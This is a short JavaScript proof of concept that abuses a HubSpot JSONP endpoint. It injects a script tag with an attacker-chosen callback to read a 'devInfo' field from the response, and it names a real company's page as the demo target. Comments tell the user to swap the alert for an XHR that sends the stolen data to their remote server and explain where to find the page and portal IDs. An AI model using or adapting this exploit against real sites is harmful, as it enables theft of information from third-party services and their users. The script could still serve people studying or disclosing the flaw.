window.history.replaceState(null, '', '/partner-tech'); // for demo purpose we are targeting https://www.contrastsecurity.com/partner-tech

function hackerHandler(e) {
    var devInfo = e.actions[4][1]
    alert(devInfo); // You can change the alert to a code that sends an XHR request to your remote server with the stolen devInfo as a parameter
}

o = document.createElement("script");
o.type = "text/javascript";
o.referrerPolicy = "no-referrer-when-downgrade";
o.async = !0;
o.src = "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/landing-pages/64848245021/actions?portalId=203759&callback=hackerHandler"; // your page id and portal ID could be found in the targeted page source code
document.getElementsByTagName("head")[0].appendChild(o)

